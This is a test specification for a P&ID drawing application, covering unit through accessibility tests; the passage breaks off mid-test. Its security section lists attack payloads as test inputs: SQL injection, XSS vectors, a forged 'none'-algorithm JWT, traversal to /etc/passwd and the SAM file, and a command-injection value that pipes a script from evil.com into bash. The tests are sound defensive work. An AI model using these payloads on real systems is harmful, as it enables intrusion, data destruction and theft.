# Test Specifications Document - Ergoplanner AI Suite

## Version 1.0 | Date: 2025-01-19

### Table of Contents
1. [Unit Test Specifications](#1-unit-test-specifications)
2. [Integration Test Specifications](#2-integration-test-specifications)
3. [End-to-End Test Specifications](#3-end-to-end-test-specifications)
4. [Performance Test Specifications](#4-performance-test-specifications)
5. [Security Test Specifications](#5-security-test-specifications)
6. [Accessibility Test Specifications](#6-accessibility-test-specifications)
7. [Regression Test Suite](#7-regression-test-suite)
8. [Test Data Management](#8-test-data-management)

---

## 1. Unit Test Specifications

### 1.1 Coverage Requirements

| Component Type | Minimum Coverage | Target Coverage |
|---------------|-----------------|-----------------|
| Business Logic | 80% | 95% |
| Critical Paths | 90% | 100% |
| API Controllers | 85% | 95% |
| Utility Functions | 90% | 100% |
| React Components | 75% | 90% |
| Redux Logic | 85% | 95% |

### 1.2 Test Naming Conventions

```javascript
// Frontend (Jest/Vitest)
describe('ComponentName', () => {
  describe('methodName', () => {
    it('should [expected behavior] when [condition]', () => {
      // Test implementation
    });

    it('should throw [ErrorType] when [invalid condition]', () => {
      // Error test
    });
  });
});

// Backend (.NET xUnit)
[Fact]
public void MethodName_StateUnderTest_ExpectedBehavior()
{
    // Arrange
    // Act
    // Assert
}

[Theory]
[InlineData(inputValue, expectedResult)]
public void MethodName_VariousInputs_ReturnsExpectedResults()
{
    // Test implementation
}
```

### 1.3 Mock Data Requirements

```javascript
// Frontend Mock Factory
export const createMockComponent = (overrides = {}) => ({
  id: faker.datatype.uuid(),
  type: 'PUMP',
  name: faker.random.alphaNumeric(10),
  position: { x: 100, y: 100 },
  properties: {
    flowRate: 100,
    pressure: 50,
    power: 10,
    ...overrides.properties
  },
  ...overrides
});

// Backend Mock Factory (.NET)
public class ComponentFactory
{
    private readonly Faker<Component> _faker;

    public ComponentFactory()
    {
        _faker = new Faker<Component>()
            .RuleFor(c => c.Id, f => f.Random.Guid())
            .RuleFor(c => c.Type, f => f.PickRandom<ComponentType>())
            .RuleFor(c => c.Name, f => f.Commerce.ProductName())
            .RuleFor(c => c.Properties, f => new ComponentProperties
            {
                FlowRate = f.Random.Double(10, 500),
                Pressure = f.Random.Double(10, 100),
                Power = f.Random.Double(1, 50)
            });
    }

    public Component Create(Action<Component> customize = null)
    {
        var component = _faker.Generate();
        customize?.Invoke(component);
        return component;
    }
}
```

### 1.4 Assertion Patterns

```javascript
// Component Testing
expect(component).toBeInTheDocument();
expect(component).toHaveAttribute('aria-label', 'Pump Component');
expect(component).toHaveStyle({ backgroundColor: 'rgb(255, 0, 0)' });

// State Testing
expect(store.getState().components).toEqual(
  expect.arrayContaining([
    expect.objectContaining({
      id: expect.any(String),
      type: 'PUMP',
      properties: expect.objectContaining({
        flowRate: expect.any(Number)
      })
    })
  ])
);

// API Response Testing (.NET)
result.Should().BeOfType<OkObjectResult>();
result.Value.Should().BeEquivalentTo(expectedComponent);
result.StatusCode.Should().Be(200);
```

### 1.5 Test Categories and Tagging

```javascript
// Jest/Vitest Tags
describe('Component Tests @unit @fast', () => {
  test('Critical path test @critical @smoke', () => {});
  test('Edge case test @edge @regression', () => {});
});

// .NET Categories
[Trait("Category", "Unit")]
[Trait("Priority", "Critical")]
[Trait("TestType", "Smoke")]
public class ComponentServiceTests
{
    // Test methods
}
```

### 1.6 Test Data Factories

```javascript
// Complex Object Factory
class DrawingFactory {
  static create(options = {}) {
    const defaults = {
      id: uuid(),
      name: 'Test Drawing',
      version: '1.0.0',
      components: [],
      connections: [],
      metadata: {
        createdAt: new Date(),
        createdBy: 'test-user',
        lastModified: new Date()
      }
    };

    return {
      ...defaults,
      ...options,
      components: options.components ||
        Array.from({ length: 5 }, () => ComponentFactory.create()),
      connections: options.connections ||
        Array.from({ length: 3 }, () => ConnectionFactory.create())
    };
  }
}
```

### 1.7 Specific Unit Test Cases

#### 1.7.1 Component Service Tests

```javascript
describe('ComponentService', () => {
  describe('addComponent', () => {
    it('should add component with valid properties', () => {
      // Arrange
      const component = createMockComponent({
        type: 'PUMP',
        properties: { flowRate: 150 }
      });

      // Act
      const result = componentService.addComponent(component);

      // Assert
      expect(result.id).toBeDefined();
      expect(result.type).toBe('PUMP');
      expect(result.properties.flowRate).toBe(150);
    });

    it('should throw ValidationError when flowRate exceeds maximum', () => {
      // Arrange
      const component = createMockComponent({
        properties: { flowRate: 1001 } // Max is 1000
      });

      // Act & Assert
      expect(() => componentService.addComponent(component))
        .toThrow(ValidationError);
      expect(() => componentService.addComponent(component))
        .toThrow('Flow rate cannot exceed 1000 m³/h');
    });
  });
});
```

---

## 2. Integration Test Specifications

### 2.1 API Endpoint Testing

#### 2.1.1 Component API Tests

```javascript
describe('Component API Integration', () => {
  beforeEach(async () => {
    await db.migrate.latest();
    await db.seed.run();
  });

  afterEach(async () => {
    await db.migrate.rollback();
  });

  describe('POST /api/components', () => {
    it('should create component and return 201', async () => {
      // Arrange
      const componentData = {
        type: 'VALVE',
        name: 'Test Valve',
        properties: {
          size: 'DN100',
          pressure: 16,
          material: 'SS316'
        }
      };

      // Act
      const response = await request(app)
        .post('/api/components')
        .set('Authorization', 'Bearer valid-token')
        .send(componentData);

      // Assert
      expect(response.status).toBe(201);
      expect(response.body).toMatchObject({
        id: expect.any(String),
        type: 'VALVE',
        name: 'Test Valve',
        properties: expect.objectContaining({
          size: 'DN100',
          pressure: 16
        })
      });

      // Verify database
      const saved = await db('components')
        .where('id', response.body.id)
        .first();
      expect(saved).toBeDefined();
      expect(saved.type).toBe('VALVE');
    });

    it('should return 400 for invalid component data', async () => {
      // Arrange
      const invalidData = {
        type: 'INVALID_TYPE',
        properties: {} // Missing required fields
      };

      // Act
      const response = await request(app)
        .post('/api/components')
        .set('Authorization', 'Bearer valid-token')
        .send(invalidData);

      // Assert
      expect(response.status).toBe(400);
      expect(response.body.errors).toContainEqual(
        expect.objectContaining({
          field: 'type',
          message: 'Invalid component type'
        })
      );
    });
  });

  describe('GET /api/components/:id', () => {
    it('should retrieve component with relationships', async () => {
      // Arrange
      const componentId = 'test-component-123';

      // Act
      const response = await request(app)
        .get(`/api/components/${componentId}`)
        .set('Authorization', 'Bearer valid-token');

      // Assert
      expect(response.status).toBe(200);
      expect(response.body).toMatchObject({
        id: componentId,
        connections: expect.any(Array),
        specifications: expect.any(Array),
        history: expect.any(Array)
      });
    });
  });
});
```

### 2.2 Database Transaction Testing

```javascript
describe('Database Transactions', () => {
  it('should rollback on partial failure', async () => {
    const trx = await db.transaction();

    try {
      // First operation succeeds
      await trx('components').insert({
        id: 'comp-1',
        type: 'PUMP',
        properties: {}
      });

      // Second operation fails (duplicate ID)
      await trx('components').insert({
        id: 'comp-1', // Duplicate
        type: 'VALVE',
        properties: {}
      });

      await trx.commit();
    } catch (error) {
      await trx.rollback();
    }

    // Verify rollback
    const count = await db('components')
      .where('id', 'comp-1')
      .count();
    expect(count[0]['count(*)']).toBe(0);
  });
});
```

### 2.3 External Service Mocking

```javascript
// MSW Setup
import { setupServer } from 'msw/node';
import { rest } from 'msw';

const server = setupServer(
  rest.post('https://api.ai-service.com/generate', (req, res, ctx) => {
    return res(
      ctx.json({
        drawing: {
          components: [
            { type: 'PUMP', x: 100, y: 100 },
            { type: 'VALVE', x: 200, y: 100 }
          ]
        }
      })
    );
  }),

  rest.post('https://api.email-service.com/send', (req, res, ctx) => {
    return res(ctx.json({ messageId: 'msg-123', status: 'sent' }));
  })
);

beforeAll(() => server.listen());
afterEach(() => server.resetHandlers());
afterAll(() => server.close());
```

### 2.4 WebSocket Integration Tests

```javascript
describe('WebSocket Real-time Updates', () => {
  let wsClient;

  beforeEach(() => {
    wsClient = new WebSocket('ws://localhost:3001');
  });

  afterEach(() => {
    wsClient.close();
  });

  it('should broadcast component updates to all clients', (done) => {
    const client1 = new WebSocket('ws://localhost:3001');
    const client2 = new WebSocket('ws://localhost:3001');

    let receivedCount = 0;
    const expectedMessage = {
      type: 'COMPONENT_UPDATE',
      data: { id: 'comp-123', status: 'modified' }
    };

    client1.on('message', (data) => {
      const message = JSON.parse(data);
      expect(message).toEqual(expectedMessage);
      receivedCount++;
      if (receivedCount === 2) done();
    });

    client2.on('message', (data) => {
      const message = JSON.parse(data);
      expect(message).toEqual(expectedMessage);
      receivedCount++;
      if (receivedCount === 2) done();
    });

    // Trigger update
    setTimeout(() => {
      wsClient.send(JSON.stringify(expectedMessage));
    }, 100);
  });
});
```

### 2.5 File Upload/Download Testing

```javascript
describe('File Operations', () => {
  it('should upload and process P&ID file', async () => {
    // Arrange
    const filePath = path.join(__dirname, 'fixtures/sample-pid.dxf');

    // Act
    const response = await request(app)
      .post('/api/files/upload')
      .attach('file', filePath)
      .field('type', 'P&ID')
      .field('projectId', 'proj-123');

    // Assert
    expect(response.status).toBe(200);
    expect(response.body).toMatchObject({
      fileId: expect.any(String),
      originalName: 'sample-pid.dxf',
      processedComponents: expect.any(Number),
      status: 'processed'
    });
  });

  it('should reject files exceeding size limit', async () => {
    // Create large file (>50MB)
    const largeFile = Buffer.alloc(51 * 1024 * 1024);

    // Act
    const response = await request(app)
      .post('/api/files/upload')
      .attach('file', largeFile, 'large-file.dxf');

    // Assert
    expect(response.status).toBe(413);
    expect(response.body.error).toBe('File size exceeds 50MB limit');
  });
});
```

---

## 3. End-to-End Test Specifications

### 3.1 User Journey Scenarios

#### 3.1.1 Complete P&ID Creation Workflow

```javascript
describe('P&ID Creation E2E', () => {
  beforeEach(() => {
    cy.login('engineer@ergoplanner.com', 'SecurePass123!');
    cy.visit('/projects');
  });

  it('should complete full P&ID creation workflow', () => {
    // Step 1: Create new project
    cy.contains('New Project').click();
    cy.get('[data-testid="project-name"]').type('Water Treatment Plant');
    cy.get('[data-testid="project-type"]').select('P&ID');
    cy.get('[data-testid="create-btn"]').click();

    // Step 2: Add components
    cy.get('[data-testid="symbol-library"]').should('be.visible');
    cy.dragAndDrop('[data-testid="pump-symbol"]', '[data-testid="canvas"]',
      { x: 200, y: 300 });
    cy.dragAndDrop('[data-testid="valve-symbol"]', '[data-testid="canvas"]',
      { x: 400, y: 300 });
    cy.dragAndDrop('[data-testid="tank-symbol"]', '[data-testid="canvas"]',
      { x: 600, y: 300 });

    // Step 3: Connect components
    cy.get('[data-testid="connection-tool"]').click();
    cy.get('[data-testid="component-pump-1"]').click();
    cy.get('[data-testid="component-valve-1"]').click();
    cy.get('[data-testid="connection-1"]').should('exist');

    // Step 4: Set properties
    cy.get('[data-testid="component-pump-1"]').dblclick();
    cy.get('[data-testid="flow-rate-input"]').clear().type('250');
    cy.get('[data-testid="pressure-input"]').clear().type('16');
    cy.get('[data-testid="tag-input"]').type('P-101');
    cy.get('[data-testid="save-properties"]').click();

    // Step 5: Add annotations
    cy.get('[data-testid="text-tool"]').click();
    cy.get('[data-testid="canvas"]').click(300, 250);
    cy.type('Main Feed Pump');

    // Step 6: Save drawing
    cy.get('[data-testid="save-drawing"]').click();
    cy.get('[data-testid="save-success"]').should('be.visible');

    // Step 7: Export
    cy.get('[data-testid="export-menu"]').click();
    cy.get('[data-testid="export-pdf"]').click();
    cy.get('[data-testid="download-started"]').should('be.visible');

    // Verify file download
    cy.readFile('cypress/downloads/Water_Treatment_Plant_PID.pdf')
      .should('exist');
  });
});
```

#### 3.1.2 Collaborative Editing Scenario

```javascript
describe('Multi-user Collaboration', () => {
  it('should handle concurrent editing with conflict resolution', () => {
    // User 1 actions
    cy.task('createSession', { userId: 'user1' }).then((session1) => {
      cy.window().then((win) => {
        win.sessionStorage.setItem('authToken', session1.token);
      });
    });

    cy.visit('/drawings/shared-drawing-123');
    cy.get('[data-testid="component-pump-1"]').dblclick();
    cy.get('[data-testid="flow-rate-input"]').clear().type('300');

    // User 2 simultaneous actions
    cy.task('createSession', { userId: 'user2' }).then((session2) => {
      cy.window().then((win) => {
        win.sessionStorage.setItem('authToken', session2.token);
      });
    });

    cy.visit('/drawings/shared-drawing-123');
    cy.get('[data-testid="component-pump-1"]').dblclick();
    cy.get('[data-testid="flow-rate-input"]').clear().type('350');
    cy.get('[data-testid="save-properties"]').click();

    // Conflict resolution
    cy.get('[data-testid="conflict-dialog"]').should('be.visible');
    cy.get('[data-testid="merge-changes"]').click();
    cy.get('[data-testid="review-changes"]').should('contain', 'User 1: 300');
    cy.get('[data-testid="review-changes"]').should('contain', 'User 2: 350');
    cy.get('[data-testid="accept-user2"]').click();

    // Verify resolution
    cy.get('[data-testid="flow-rate-display"]').should('have.text', '350');
  });
});
```

### 3.2 Browser Compatibility Matrix

| Browser | Version | Desktop | Mobile | Touch Support | Status |
|---------|---------|---------|--------|---------------|---------|
| Chrome | 96+ | ✓ | ✓ | ✓ | Fully Supported |
| Firefox | 95+ | ✓ | ✓ | ✓ | Fully Supported |
| Safari | 15+ | ✓ | ✓ | ✓ | Fully Supported |
| Edge | 96+ | ✓ | ✓ | ✓ | Fully Supported |
| Opera | 82+ | ✓ | ✓ | ✓ | Partially Supported |
| Samsung Internet | 16+ | - | ✓ | ✓ | Partially Supported |

### 3.3 Device Testing Requirements

```javascript
// Cypress Device Testing
const devices = [
  { name: 'Desktop HD', width: 1920, height: 1080 },
  { name: 'Desktop', width: 1366, height: 768 },
  { name: 'Tablet', width: 768, height: 1024 },
  { name: 'Mobile', width: 375, height: 667 }
];

devices.forEach(device => {
  describe(`Testing on ${device.name}`, () => {
    beforeEach(() => {
      cy.viewport(device.width, device.height);
    });

    it('should render canvas correctly', () => {
      cy.visit('/drawings/new');
      cy.get('[data-testid="canvas"]').should('be.visible');
      cy.get('[data-testid="canvas"]')
        .should('have.css', 'width')
        .and('match', /\d+px/);
    });
  });
});
```

### 3.4 Page Object Models

```javascript
// DrawingCanvas Page Object
class DrawingCanvasPage {
  constructor() {
    this.url = '/drawings';
    this.elements = {
      canvas: () => cy.get('[data-testid="canvas"]'),
      symbolLibrary: () => cy.get('[data-testid="symbol-library"]'),
      propertyPanel: () => cy.get('[data-testid="property-panel"]'),
      toolbar: () => cy.get('[data-testid="toolbar"]'),
      saveButton: () => cy.get('[data-testid="save-btn"]'),
      exportButton: () => cy.get('[data-testid="export-btn"]')
    };
  }

  visit() {
    return cy.visit(this.url);
  }

  addComponent(componentType, position) {
    this.elements.symbolLibrary()
      .find(`[data-testid="${componentType}-symbol"]`)
      .drag('[data-testid="canvas"]', {
        force: true,
        position: position
      });
    return this;
  }

  connectComponents(fromId, toId) {
    cy.get('[data-testid="connection-tool"]').click();
    cy.get(`[data-testid="${fromId}"]`).click();
    cy.get(`[data-testid="${toId}"]`).click();
    return this;
  }

  setComponentProperty(componentId, property, value) {
    cy.get(`[data-testid="${componentId}"]`).dblclick();
    cy.get(`[data-testid="${property}-input"]`).clear().type(value);
    cy.get('[data-testid="apply-properties"]').click();
    return this;
  }

  saveDrawing(name) {
    this.elements.saveButton().click();
    cy.get('[data-testid="drawing-name"]').clear().type(name);
    cy.get('[data-testid="confirm-save"]').click();
    return this;
  }
}

// Usage in tests
const drawingPage = new DrawingCanvasPage();
drawingPage
  .visit()
  .addComponent('pump', { x: 100, y: 100 })
  .addComponent('valve', { x: 200, y: 100 })
  .connectComponents('component-1', 'component-2')
  .setComponentProperty('component-1', 'flow-rate', '250')
  .saveDrawing('Test Drawing');
```

---

## 4. Performance Test Specifications

### 4.1 Load Test Scenarios

```javascript
// k6 Load Test Script
import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate } from 'k6/metrics';

const errorRate = new Rate('errors');

// Test Configurations
export const options = {
  stages: [
    { duration: '2m', target: 10 },  // Ramp up to 10 users
    { duration: '5m', target: 10 },  // Stay at 10 users
    { duration: '2m', target: 50 },  // Ramp up to 50 users
    { duration: '5m', target: 50 },  // Stay at 50 users
    { duration: '2m', target: 100 }, // Ramp up to 100 users
    { duration: '5m', target: 100 }, // Stay at 100 users
    { duration: '2m', target: 500 }, // Ramp up to 500 users
    { duration: '5m', target: 500 }, // Stay at 500 users
    { duration: '5m', target: 0 },   // Ramp down to 0 users
  ],
  thresholds: {
    http_req_duration: ['p(95)<2000'], // 95% of requests under 2s
    http_req_failed: ['rate<0.1'],     // Error rate under 10%
    errors: ['rate<0.1'],               // Custom error rate under 10%
  },
};

export default function () {
  const BASE_URL = 'https://api.ergoplanner.com';

  // Scenario 1: Load Drawing
  let response = http.get(`${BASE_URL}/api/drawings/sample-drawing`);
  check(response, {
    'status is 200': (r) => r.status === 200,
    'response time < 2000ms': (r) => r.timings.duration < 2000,
    'contains components': (r) => JSON.parse(r.body).components.length > 0,
  });
  errorRate.add(response.status !== 200);

  sleep(1);

  // Scenario 2: Update Component
  const payload = JSON.stringify({
    componentId: 'comp-123',
    properties: {
      flowRate: Math.random() * 500,
      pressure: Math.random() * 100,
    },
  });

  response = http.put(
    `${BASE_URL}/api/components/comp-123`,
    payload,
    { headers: { 'Content-Type': 'application/json' } }
  );

  check(response, {
    'update successful': (r) => r.status === 200,
    'update time < 1000ms': (r) => r.timings.duration < 1000,
  });

  sleep(2);

  // Scenario 3: Generate BoQ
  response = http.post(`${BASE_URL}/api/boq/generate`,
    JSON.stringify({ drawingId: 'drawing-123' }),
    { headers: { 'Content-Type': 'application/json' } }
  );

  check(response, {
    'BoQ generated': (r) => r.status === 200,
    'generation time < 3000ms': (r) => r.timings.duration < 3000,
  });

  sleep(3);
}
```

### 4.2 Response Time Thresholds

| Operation | P50 | P95 | P99 | Max Acceptable |
|-----------|-----|-----|-----|----------------|
| Load Drawing (< 100 components) | 200ms | 500ms | 1000ms | 2000ms |
| Load Drawing (100-500 components) | 500ms | 1500ms | 2500ms | 5000ms |
| Save Drawing | 300ms | 800ms | 1500ms | 3000ms |
| Update Component | 100ms | 300ms | 500ms | 1000ms |
| Generate BoQ | 500ms | 2000ms | 3000ms | 5000ms |
| Export PDF | 1000ms | 3000ms | 5000ms | 10000ms |
| Real-time Sync | 50ms | 100ms | 150ms | 500ms |
| Symbol Library Load | 200ms | 400ms | 500ms | 1000ms |

### 4.3 Throughput Requirements

```javascript
// JMeter Throughput Test Configuration
const throughputTest = {
  testPlan: 'Ergoplanner Throughput Test',
  threadGroups: [
    {
      name: 'API Throughput',
      threads: 100,
      rampUp: 60,
      duration: 300,
      samplers: [
        {
          name: 'Component CRUD Operations',
          expectedThroughput: 1000, // requests per minute
        },
        {
          name: 'Drawing Operations',
          expectedThroughput: 500, // requests per minute
        },
        {
          name: 'BoQ Calculations',
          expectedThroughput: 100, // requests per minute
        },
      ],
    },
  ],
};
```

### 4.4 Resource Utilization Limits

| Resource | Warning Threshold | Critical Threshold | Action |
|----------|------------------|-------------------|---------|
| CPU Usage | 70% | 85% | Auto-scale horizontally |
| Memory Usage | 75% | 90% | Restart service |
| Database Connections | 80% | 95% | Increase pool size |
| Disk I/O | 70% | 85% | Optimize queries |
| Network Bandwidth | 60% | 80% | Enable compression |
| Redis Memory | 70% | 85% | Clear old cache |

### 4.5 Stress Test Scenarios

```javascript
// Artillery Stress Test
const stressConfig = {
  config: {
    target: 'https://api.ergoplanner.com',
    phases: [
      { duration: 60, arrivalRate: 10 },   // Warm up
      { duration: 120, arrivalRate: 100 }, // Normal load
      { duration: 60, arrivalRate: 500 },  // Stress load
      { duration: 30, arrivalRate: 1000 }, // Breaking point
    ],
  },
  scenarios: [
    {
      name: 'Complex Drawing Stress',
      flow: [
        { post: { url: '/api/drawings', json: { /* 500+ components */ } } },
        { think: 1 },
        { get: { url: '/api/drawings/{{ drawingId }}' } },
        { loop: [
          { put: { url: '/api/components/random' } },
          { think: 0.5 },
        ], count: 50 },
      ],
    },
  ],
};
```

### 4.6 Spike Test Patterns

```javascript
// k6 Spike Test
export const options = {
  stages: [
    { duration: '1m', target: 10 },   // Normal load
    { duration: '30s', target: 500 }, // Spike to 500 users
    { duration: '1m', target: 500 },  // Stay at spike
    { duration: '30s', target: 10 },  // Scale down
    { duration: '2m', target: 10 },   // Recovery period
  ],
  thresholds: {
    http_req_duration: ['p(95)<3000'], // Allow higher during spike
    http_req_failed: ['rate<0.15'],    // Allow 15% errors during spike
  },
};
```

---

## 5. Security Test Specifications

### 5.1 OWASP Top 10 Test Cases

#### 5.1.1 SQL Injection Testing

```javascript
describe('SQL Injection Tests', () => {
  const sqlInjectionPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE components; --",
    "1' UNION SELECT * FROM users--",
    "admin'--",
    "' OR 1=1--",
    "1' AND '1'='2' UNION SELECT NULL, username, password FROM users--",
  ];

  sqlInjectionPayloads.forEach(payload => {
    it(`should prevent SQL injection with payload: ${payload}`, async () => {
      const response = await request(app)
        .get(`/api/components/search?name=${encodeURIComponent(payload)}`)
        .set('Authorization', 'Bearer valid-token');

      expect(response.status).not.toBe(500);
      expect(response.body).not.toContain('SQL');
      expect(response.body).not.toContain('syntax error');
    });
  });
});
```

#### 5.1.2 XSS Test Vectors

```javascript
describe('XSS Prevention Tests', () => {
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<body onload=alert("XSS")>',
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
  ];

  xssPayloads.forEach(payload => {
    it(`should sanitize XSS payload: ${payload.substring(0, 20)}...`, async () => {
      const response = await request(app)
        .post('/api/components')
        .set('Authorization', 'Bearer valid-token')
        .send({
          name: payload,
          description: payload,
        });

      // Check response doesn't reflect script
      expect(response.text).not.toContain('<script');
      expect(response.text).not.toContain('onerror=');
      expect(response.text).not.toContain('javascript:');

      // Verify stored data is sanitized
      if (response.body.id) {
        const stored = await request(app)
          .get(`/api/components/${response.body.id}`)
          .set('Authorization', 'Bearer valid-token');

        expect(stored.body.name).not.toContain('<script');
        expect(stored.body.description).not.toContain('<script');
      }
    });
  });
});
```

### 5.2 Authentication Bypass Attempts

```javascript
describe('Authentication Security Tests', () => {
  it('should prevent access without token', async () => {
    const response = await request(app)
      .get('/api/drawings/protected-drawing');

    expect(response.status).toBe(401);
    expect(response.body.error).toBe('Authentication required');
  });

  it('should reject expired tokens', async () => {
    const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEiLCJleHAiOjEwMDAwMDAwMDB9.signature';

    const response = await request(app)
      .get('/api/drawings/protected-drawing')
      .set('Authorization', `Bearer ${expiredToken}`);

    expect(response.status).toBe(401);
    expect(response.body.error).toBe('Token expired');
  });

  it('should prevent JWT algorithm confusion', async () => {
    // Attempt to use 'none' algorithm
    const maliciousToken = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6IjEiLCJyb2xlIjoiYWRtaW4ifQ.';

    const response = await request(app)
      .get('/api/admin/users')
      .set('Authorization', `Bearer ${maliciousToken}`);

    expect(response.status).toBe(401);
  });

  it('should prevent privilege escalation', async () => {
    const userToken = await getTokenForUser('regular-user');

    const response = await request(app)
      .get('/api/admin/settings')
      .set('Authorization', `Bearer ${userToken}`);

    expect(response.status).toBe(403);
    expect(response.body.error).toBe('Insufficient permissions');
  });
});
```

### 5.3 Authorization Matrix Testing

```javascript
const authorizationMatrix = {
  endpoints: [
    {
      path: '/api/drawings',
      method: 'GET',
      roles: {
        admin: 200,
        engineer: 200,
        viewer: 200,
        anonymous: 401,
      },
    },
    {
      path: '/api/drawings',
      method: 'POST',
      roles: {
        admin: 201,
        engineer: 201,
        viewer: 403,
        anonymous: 401,
      },
    },
    {
      path: '/api/admin/users',
      method: 'GET',
      roles: {
        admin: 200,
        engineer: 403,
        viewer: 403,
        anonymous: 401,
      },
    },
  ],
};

describe('Authorization Matrix Tests', () => {
  authorizationMatrix.endpoints.forEach(endpoint => {
    Object.entries(endpoint.roles).forEach(([role, expectedStatus]) => {
      it(`${role} should get ${expectedStatus} for ${endpoint.method} ${endpoint.path}`, async () => {
        const token = role === 'anonymous' ? null : await getTokenForRole(role);

        const req = request(app)[endpoint.method.toLowerCase()](endpoint.path);

        if (token) {
          req.set('Authorization', `Bearer ${token}`);
        }

        const response = await req;
        expect(response.status).toBe(expectedStatus);
      });
    });
  });
});
```

### 5.4 CSRF Protection Validation

```javascript
describe('CSRF Protection', () => {
  it('should reject requests without CSRF token', async () => {
    const response = await request(app)
      .post('/api/components')
      .set('Authorization', 'Bearer valid-token')
      .send({ name: 'Test Component' });

    expect(response.status).toBe(403);
    expect(response.body.error).toBe('Invalid CSRF token');
  });

  it('should accept requests with valid CSRF token', async () => {
    // Get CSRF token
    const tokenResponse = await request(app)
      .get('/api/csrf-token')
      .set('Authorization', 'Bearer valid-token');

    const csrfToken = tokenResponse.body.token;

    // Make request with CSRF token
    const response = await request(app)
      .post('/api/components')
      .set('Authorization', 'Bearer valid-token')
      .set('X-CSRF-Token', csrfToken)
      .send({ name: 'Test Component' });

    expect(response.status).toBe(201);
  });
});
```

### 5.5 API Rate Limiting Tests

```javascript
describe('Rate Limiting', () => {
  it('should enforce rate limits per IP', async () => {
    const requests = [];

    // Make 101 requests (limit is 100 per minute)
    for (let i = 0; i < 101; i++) {
      requests.push(
        request(app)
          .get('/api/components')
          .set('X-Forwarded-For', '192.168.1.100')
      );
    }

    const responses = await Promise.all(requests);
    const rateLimited = responses.filter(r => r.status === 429);

    expect(rateLimited.length).toBeGreaterThan(0);
    expect(rateLimited[0].body.error).toBe('Rate limit exceeded');
    expect(rateLimited[0].headers['retry-after']).toBeDefined();
  });

  it('should handle burst traffic correctly', async () => {
    const burstSize = 20;
    const requests = [];

    // Send burst of requests
    for (let i = 0; i < burstSize; i++) {
      requests.push(
        request(app).get('/api/components')
      );
    }

    const responses = await Promise.all(requests);
    const successful = responses.filter(r => r.status === 200);

    expect(successful.length).toBe(burstSize); // All should succeed within burst limit
  });
});
```

### 5.6 Penetration Test Scenarios

```javascript
// Automated Penetration Testing Suite
describe('Penetration Testing', () => {
  describe('Directory Traversal', () => {
    const traversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ];

    traversalPayloads.forEach(payload => {
      it(`should prevent directory traversal: ${payload}`, async () => {
        const response = await request(app)
          .get(`/api/files/${encodeURIComponent(payload)}`);

        expect(response.status).toBe(400);
        expect(response.body).not.toContain('root:');
        expect(response.body).not.toContain('Administrator');
      });
    });
  });

  describe('Command Injection', () => {
    const commandPayloads = [
      '; ls -la',
      '| whoami',
      '`cat /etc/passwd`',
      '$(curl evil.com/shell.sh | bash)',
    ];

    commandPayloads.forEach(payload => {
      it(`should prevent command injection: ${payload}`, async () => {
        const response = await request(app)
          .post('/api/export')
          .send({ filename: payload });

        expect(response.status).not.toBe(500);
        expect(response.text).not.toMatch(/root|admin|usr\/bin/);
      });
    });
  });
});
```

---

## 6. Accessibility Test Specifications

### 6.1 WCAG 2.1 AA Compliance Checklist

| Criterion | Level | Test Method | Pass Criteria |
|-----------|-------|-------------|---------------|
| 1.1.1 Non-text Content | A | Automated + Manual | All images have alt text |
| 1.3.1 Info and Relationships | A | Automated | Proper heading hierarchy |
| 1.4.3 Contrast (Minimum) | AA | Automated | 4.5:1 for normal text, 3:1 for large |
| 1.4.10 Reflow | AA | Manual | No horizontal scroll at 400% zoom |
| 2.1.1 Keyboard | A | Manual | All functions keyboard accessible |
| 2.1.2 No Keyboard Trap | A | Manual | Can exit all components with keyboard |
| 2.4.3 Focus Order | A | Manual | Logical tab order |
| 2.4.7 Focus Visible | AA | Automated + Manual | Clear focus indicators |
| 3.1.1 Language of Page | A | Automated | HTML lang attribute present |
| 3.3.2 Labels or Instructions | A | Automated | All inputs have labels |
| 4.1.2 Name, Role, Value | A | Automated | Proper ARIA attributes |

### 6.2 Screen Reader Testing Requirements

```javascript
describe('Screen Reader Compatibility', () => {
  beforeEach(() => {
    cy.visit('/drawings/new');
    cy.injectAxe(); // Inject axe-core for accessibility testing
  });

  it('should announce component additions', () => {
    // Add component
    cy.get('[data-testid="pump-symbol"]').click();

    // Check ARIA live region
    cy.get('[role="status"]')
      .should('contain', 'Pump component added to canvas');

    // Verify screen reader can identify component
    cy.get('[data-testid="component-pump-1"]')
      .should('have.attr', 'role', 'img')
      .should('have.attr', 'aria-label', 'Pump component at position 100, 100');
  });

  it('should provide context for form fields', () => {
    cy.get('[data-testid="component-pump-1"]').dblclick();

    // Check form field labeling
    cy.get('#flow-rate-input')
      .should('have.attr', 'aria-label', 'Flow Rate in cubic meters per hour')
      .should('have.attr', 'aria-describedby', 'flow-rate-help');

    cy.get('#flow-rate-help')
      .should('contain', 'Enter a value between 0 and 1000');
  });

  it('should announce validation errors', () => {
    cy.get('#flow-rate-input').type('-50');
    cy.get('[data-testid="save-properties"]').click();

    // Check error announcement
    cy.get('[role="alert"]')
      .should('contain', 'Flow rate must be positive');

    cy.get('#flow-rate-input')
      .should('have.attr', 'aria-invalid', 'true')
      .should('have.attr', 'aria-describedby')
      .and('contain', 'flow-rate-error');
  });
});
```

### 6.3 Keyboard Navigation Test Cases

```javascript
describe('Keyboard Navigation', () => {
  it('should navigate through toolbar using arrow keys', () => {
    cy.visit('/drawings/new');

    // Focus toolbar
    cy.get('[data-testid="toolbar"]').focus();

    // Navigate with arrow keys
    cy.realPress('ArrowRight');
    cy.focused().should('have.attr', 'data-testid', 'select-tool');

    cy.realPress('ArrowRight');
    cy.focused().should('have.attr', 'data-testid', 'pan-tool');

    cy.realPress('ArrowLeft');
    cy.focused().should('have.attr', 'data-testid', 'select-tool');

    // Activate tool with Enter
    cy.realPress('Enter');
    cy.get('[data-testid="select-tool"]')
      .should('have.attr', 'aria-pressed', 'true');
  });

  it('should support keyboard shortcuts', () => {
    // Test common shortcuts
